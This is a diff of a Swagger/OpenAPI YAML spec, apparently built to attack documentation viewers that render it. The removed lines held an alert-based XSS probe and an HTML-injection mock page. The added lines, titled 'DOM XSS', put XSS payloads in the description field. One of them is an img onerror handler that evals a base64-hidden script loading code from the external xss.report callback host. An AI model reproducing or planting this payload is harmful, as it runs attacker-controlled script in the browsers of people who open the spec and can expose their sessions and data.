@@ -1,32 +1,11 @@
 swagger: '2.0'
-
 info:
-  title: Basic Login Form
-  version: '1.0.0'
-  description: '<img src=x onerror=alert(document.domain)>'
-
+  version: 1.0.0
+  title: DOM XSS
+  description: '<img src=x onerror=alert(1)><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL25vMXhqb2hud2ljayI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>'
 paths:
-  /test:
-    get:
-      summary: Simple login
-      produces:
-        - text/html
+  /:
+    post:
       responses:
-        200:
-          description: Login form
-          x-amazon-apigateway-integration:
-            type: mock
-            responses:
-              default:
-                statusCode: "200"
-                responseTemplates:
-                  text/html: |
-                    <!DOCTYPE html>
-                    <html>
-                      <head>
-                        <title>HTMLI</title>
-                      </head>
-                      <body>
-                        <h1 style="color: red;">HTML Injection</h1>
-                      </body>
-                    </html>
+        '200':
+          description: Login successful
